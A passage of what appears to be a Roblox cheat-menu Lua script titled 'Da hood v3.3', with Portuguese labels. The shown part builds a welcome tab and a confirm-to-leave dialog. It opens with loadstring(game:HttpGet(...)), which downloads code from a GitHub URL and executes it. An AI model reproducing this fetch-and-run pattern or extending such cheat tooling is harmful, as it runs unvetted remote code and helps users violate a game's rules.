local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()

local UI = Material.Load({
     Title = "Da hood v3.3",
     Style = 3,
     SizeX = 400,
     SizeY = 300,
     Theme = "Light"
})

local BemVindas = UI.New({
    Title = "Bem-Vindas"
})
BemVindas.Button({
    Text = "Bem vindo "..game.Players.LocalPlayer.Name.."!"
})
BemVindas.Button({
    Text = "Sair do jogo [ cuidado para nn clicar semquerer ]",
    Callback = function()
        local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Text = Instance.new("TextLabel")
local Button2 = Instance.new("TextButton")
local Button1 = Instance.new("TextButton")

Button1.Text = "sim" -- Primeiro
Button2.Text = "nao" -- Segundo
Title.Text = "Deseja realmente" -- Titulo
Text.Text = "sair?" -- Texto
function Ativa()
	game.Players.LocalPlayer:kick()
end
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
Frame.BackgroundTransparency = 0.400
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(1.833999991, 0, 0.81400001, 0)
Frame.Size = UDim2.new(0, 170, 0, 56)

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Size = UDim2.new(1, 0, 0, 15)
Title.Font = Enum.Font.SourceSans
Title.TextColor3 = Color3.fromRGB(0, 0, 0)
Title.TextSize = 14.000

Text.Name = "Text"
Text.Parent = Frame
Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text.BackgroundTransparency = 1.000
Text.Position = UDim2.new(0, 0, 0.357142866, 0)
Text.Size = UDim2.new(1, 0, 0.375, 15)
Text.Font = Enum.Font.SourceSans
Text.TextColor3 = Color3.fromRGB(0, 0, 0)
Text.TextSize = 14.000
Text.TextWrapped = true

Button2.Name = "Button2"
Button2.Parent = Frame
Button2.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
Button2.BackgroundTransparency = 0.400
Button2.Position = UDim2.new(0.517647088, 0, 1, 0)
Button2.Size = UDim2.new(0, 82, 0, 26)
Button2.Font = Enum.Font.SourceSans
Button2.TextColor3 = Color3.fromRGB(0, 0, 0)
Button2.TextSize = 14.000
Button2.MouseButton1Click:Connect(function()
	Frame:TweenPosition(UDim2.new(1.833999991, 0, 0.81400001, 0), "In", "Quart", 1)
end)
Button1.Name = "Button1"
Button1.Parent = Frame
Button1.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
Button1.BackgroundTransparency = 0.400
Button1.Position = UDim2.new(0, 0, 1, 0)
Button1.Size = UDim2.new(0, 88, 0, 26)
Button1.Font = Enum.Font.SourceSans
Button1.TextColor3 = Color3.fromRGB(0, 0, 0)
Button1.TextSize = 14.000
Button1.MouseButton1Click:Connect(function()
	Frame:TweenPosition(UDim2.new(1.833999991, 0, 0.81400001, 0), "In", "Quart", 1)
	Ativa()
end)
wait()
Frame:TweenPosition(UDim2.new(0.833999991, 0, 0.81400001, 0), "Out", "Quart", 1)
    end
})

local PaginaVendas = UI.New({
